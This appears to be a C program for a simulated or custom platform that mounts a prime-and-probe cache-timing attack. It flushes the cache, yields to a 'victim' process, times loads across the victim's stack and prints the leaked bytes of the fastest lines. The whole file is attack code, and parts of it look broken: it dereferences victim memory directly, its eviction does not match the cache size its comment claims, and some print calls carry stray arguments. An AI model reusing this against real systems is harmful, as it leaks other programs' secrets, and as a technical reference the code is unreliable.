#include <builtin.h>
#include <stdint.h>

#define LINE_SIZE 64
/* L3 is 8192 sets * 16 ways * 64 bytes = 8 MiB. Use 1 MiB buffer, 8 passes. */
#define EVICTION_PASS_BYTES (1024 * 1024)
#define EVICTION_PASSES 8

#define VICTIM_STACK_TOP 0x300080U
#define VICTIM_STACK_SIZE (1024 * 1024)

static char eviction_buffer[EVICTION_PASS_BYTES] __attribute__((aligned(LINE_SIZE)));

static void prime(void) {
	for (int pass = 0; pass < EVICTION_PASSES; pass++) {
		for (int i = 0; i < sizeof(eviction_buffer); i += LINE_SIZE) {
			(void)*(volatile char *)(eviction_buffer + i);
		}
	}
}

static void format_cache_line(uint32_t line_addr, char *buf) {
	for (int i = 0; i < LINE_SIZE; i++) {
		char b = *(volatile char *)(uintptr_t)(line_addr + i);
		if ((b >= '0' && b <= '9') || (b >= 'A' && b <= 'Z') || (b >= 'a' && b <= 'z')) {
			buf[i] = b;
		} else {
			buf[i] = '.';
		}
	}
	buf[LINE_SIZE] = '\0';
}

static void probe(void) {
	uint32_t fastest_line = 0;
	uint64_t min_cycles = UINT64_MAX;
	uint32_t second_fastest_line = 0;
	uint64_t second_min_cycles = UINT64_MAX;
	uint32_t third_fastest_line = 0;
	uint64_t third_min_cycles = UINT64_MAX;

	for (uint32_t addr = VICTIM_STACK_TOP; addr >= VICTIM_STACK_TOP - VICTIM_STACK_SIZE; addr -= LINE_SIZE) {
		uint64_t t0 = builtin_cycle_count();
		(void)*(volatile uint32_t *)addr;
		uint64_t t1 = builtin_cycle_count();

		uint64_t delta = t1 - t0;
		if (delta < min_cycles) {
			third_min_cycles = second_min_cycles;
			third_fastest_line = second_fastest_line;
			second_min_cycles = min_cycles;
			second_fastest_line = fastest_line;
			min_cycles = delta;
			fastest_line = addr;
		} else if (delta < second_min_cycles) {
			second_min_cycles = delta;
			second_fastest_line = addr;
		} else if (delta < third_min_cycles) {
			third_min_cycles = delta;
			third_fastest_line = addr;
		}
	}

	builtin_printf("aggressor: fastest cache line: %d (%d cycles)", (int)fastest_line, (int)min_cycles);
	builtin_printf("aggressor: second fastest cache line: %d (%d cycles)", (int)second_fastest_line, (int)second_min_cycles);
	builtin_printf("aggressor: third fastest cache line: %d (%d cycles)", (int)third_fastest_line, (int)third_min_cycles);

	static char buf[LINE_SIZE + 1];
	format_cache_line(fastest_line, buf);
	builtin_printf("aggressor: cache line contents: %s", buf);
	format_cache_line(second_fastest_line, buf);
	builtin_printf("aggressor: second cache line contents: %s", buf);
	format_cache_line(third_fastest_line, buf);
	builtin_printf("aggressor: third cache line contents: %s", buf);
}

int main(void) {
	builtin_printf("aggressor: start");

	for (int i = 0; i < 3; i++) {
		builtin_printf("aggressor: yielding to victim", i);
		builtin_yield();
	}

	builtin_printf("aggressor: priming");
	prime();
	builtin_printf("aggressor: primed");

	for (int i = 0; i < 3; i++) {
		builtin_printf("aggressor: yielding to victim", i);
		builtin_yield();
	}

	builtin_printf("aggressor: probing");
	probe();
	builtin_printf("aggressor: probed");

	builtin_printf("aggressor: done");

	return 0;
}